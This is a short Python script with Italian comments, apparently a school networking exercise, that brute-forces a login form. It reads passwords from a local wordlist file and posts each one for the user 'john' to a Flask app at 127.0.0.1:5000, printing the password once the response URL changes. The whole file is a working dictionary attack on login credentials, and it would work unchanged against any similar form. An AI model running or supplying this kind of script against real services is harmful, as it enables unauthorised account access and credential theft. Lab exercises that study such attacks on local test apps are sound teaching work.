from concurrent.futures import thread
import requests
from threading import Thread
import sys

#apertura del file di testo con tutte le password possibili
f = open("C:/Users/GINOM/Dropbox/Scuola/TPSIT/Esercizi/HTTP/flask_examples/attacco/file.txt", "r").readlines()

#url iniziale per controllare se la password inserita sia giusta
url = requests.get("http://127.0.0.1:5000/").url

for k in f:
    payload = {'username': 'john', 'password': k[0:-1]}
    r = requests.post("http://127.0.0.1:5000/", data=payload)

            
    #entra nella if se la password è corretta, e quindi è cambiato l'url della pagina
    if url != r.url:
        print(f"Password: {k[0:-1]}")     
        break